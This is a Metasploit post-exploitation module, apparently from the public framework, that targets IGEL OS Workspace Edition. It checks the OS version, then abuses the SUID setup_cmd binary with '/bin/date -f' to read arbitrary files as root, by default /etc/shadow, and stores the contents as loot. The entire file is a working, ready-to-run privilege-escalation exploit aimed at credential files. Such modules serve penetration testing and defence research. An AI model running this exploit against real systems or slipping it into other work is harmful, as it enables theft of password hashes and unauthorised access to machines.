##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'IGEL OS Dump File',
        'Description' => %q{
          Dump a file with escalated privileges for IGEL OS Workspace Edition sessions,
          by elevating rights with setup_cmd (SUID) and outputting with date.
        },
        'Author' => 'Zack Didcott',
        'License' => MSF_LICENSE,
        'Platform' => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'DisclosureDate' => '2024-03-07', # Patch release date
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
    )

    register_options([
      OptString.new('RPATH', [true, 'File on the target to dump', '/etc/shadow'])
    ])
  end

  def check
    version = Rex::Version.new(
      read_file('/etc/system-release').delete_prefix('IGEL OS').strip
    )
    unless version < Rex::Version.new('11.09.260')
      return Exploit::CheckCode::Safe("IGEL OS #{version} is not vulnerable")
    end

    unless file?('/etc/setupd-usercommands.json')
      return Exploit::CheckCode::Appears("IGEL OS #{version} appears to be vulnerable")
    end

    Exploit::CheckCode::Appears("IGEL OS #{version} should be vulnerable")
  end

  def run
    unless [
      Exploit::CheckCode::Detected,
      Exploit::CheckCode::Appears,
      Exploit::CheckCode::Vulnerable
    ].include?(check)
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')
    end

    print_status('Executing command on target')
    output = create_process('/config/bin/setup_cmd', args: ['/bin/date', '-f', datastore['RPATH']])

    print_status('Command completed:')
    data = []
    output.lines[1..].each do |line|
      line = line.strip.delete_prefix(
        '/bin/date: invalid date ‘'
      ).delete_suffix('’')
      data << line
      print_line(line)
    end

    fname = File.basename(datastore['RPATH'].downcase)
    loot = store_loot("igel.#{fname}", 'text/plain', session, data.join("\n"), datastore['RPATH'])
    print_status("#{datastore['RPATH']} stored in #{loot}")
  end
end
